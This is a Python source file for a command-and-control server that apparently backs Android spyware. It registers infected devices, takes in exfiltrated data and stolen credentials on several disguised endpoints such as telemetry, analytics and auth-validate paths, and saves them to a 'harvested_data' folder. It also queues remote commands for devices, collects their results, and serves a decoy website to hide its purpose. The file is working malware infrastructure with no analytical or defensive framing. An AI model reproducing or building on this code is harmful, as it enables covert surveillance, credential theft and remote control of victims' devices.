import log_util
import os
import json
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
import threading

from admin_console import WebAdminConsole
from exfil_handler import handle_exfil_data, handle_analytics_data
from command_handler import handle_device_registration, handle_command_request, handle_command_response
from data_view import serve_data_listing, serve_command_results, serve_devices_listing
from log_util import logger

# Use the directory where the script is located for data storage
SCRIPT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DATA_DIR = os.path.join(SCRIPT_DIR, "harvested_data")


class C2RequestHandler(BaseHTTPRequestHandler):
    """
    HTTP Request handler for C2 server
    """

    def log_message(self, format, *args):
        """Override to use our custom logger instead of standard output"""
        logger.info("%s - %s", self.address_string(), format % args)

    def do_GET(self):
        """
        Handle GET requests - Process data requests or return fake website
        """
        # Parse URL path
        parsed_path = urlparse(self.path)
        path = parsed_path.path

        # Check if this is a data request from admin console
        if path.startswith('/data/'):
            # Extract the data type from the URL path
            data_type = path.split('/')[2]
            serve_data_listing(self, data_type)
            return
        elif path.startswith('/command_results/'):
            # Get command results for a specific device
            device_id = path.split('/')[2]
            serve_command_results(self, device_id)
            return
        elif path == '/devices':
            # Get list of devices
            serve_devices_listing(self)
            return

        # Default response - fake website
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

        # Send a fake website so if someone discovers the server, it doesn't look suspicious
        with open("console.html", 'r') as f:
            fake_site = f.read()
        self.wfile.write(fake_site.encode())

    def do_POST(self):
        """
        Handle POST requests containing exfiltrated data from the Android app
        """
        try:
            # Log detailed request information
            content_length = int(self.headers.get('Content-Length', 0))
            content_type = self.headers.get('Content-Type', 'unknown')
            client_ip = self.client_address[0]
            x_data_type = self.headers.get('X-Data-Type', 'none')
            x_device_id = self.headers.get('X-Device-ID', 'unknown')

            logger.debug(f"Received POST request from {client_ip} with content-type: {content_type}")
            logger.debug(f"Headers: {dict(self.headers)}")
            logger.debug(f"Content-Length: {content_length}, X-Data-Type: {x_data_type}, X-Device-ID: {x_device_id}")

            # Read request body
            post_data = self.rfile.read(content_length)

            # Parse URL path
            parsed_path = urlparse(self.path)
            path = parsed_path.path
            logger.debug(f"Request path: {path}")

            # Handle different endpoint types
            if path == "/exfil" or path == "/api/data" or path.startswith("/api/data/"):
                logger.debug("Processing exfil data request")
                handle_exfil_data(self, post_data)
            elif path == "/register" or path == "/api/register":
                logger.debug("Processing device registration request")
                handle_device_registration(self, post_data)
            elif path == "/command" or path == "/api/command":
                logger.debug("Processing command request")
                handle_command_request(self, post_data)
            elif path == "/command_response" or path == "/api/command_response":
                logger.debug("Processing command response")
                handle_command_response(self, post_data)
            elif path == "/api/analytics" or path == "/api/telemetry" or path == "/api/sync":
                # Handle other API endpoints that might be used for exfiltration
                logger.debug(f"Processing alternative exfil path: {path}")
                handle_analytics_data(self, post_data)
            elif path == "/api/auth/validate":
                # Special handling for credential validation
                logger.debug("Processing credential validation (auth) data")
                handle_exfil_data(self, post_data)
            else:
                # Respond with 404 for unrecognized paths to avoid exposing the server
                logger.warning(f"Unrecognized path requested: {path}")
                self.send_response(404)
                self.end_headers()

        except Exception as e:
            logger.error(f"Error handling POST request: {str(e)}")
            logger.exception("Full exception details:")
            self.send_response(500)
            self.end_headers()


def run_c2_server(port, admin_port=8080):
    """Run the C2 server with Firebase integration"""
    # Create data directory if it doesn't exist
    os.makedirs(DATA_DIR, exist_ok=True)

    # Create HTTPS server
    httpd = HTTPServer(('0.0.0.0', port), C2RequestHandler)

    # Start admin console
    admin_console = WebAdminConsole(admin_port)
    admin_console.start()

    try:
        # Run server
        logger.info(f"C2 server running on port {port}")
        logger.info(f"Admin console running on port {admin_port}")
        httpd.serve_forever()
    except KeyboardInterrupt:
        logger.info("Server shutting down...")
    finally:
        httpd.server_close()
        admin_console.stop()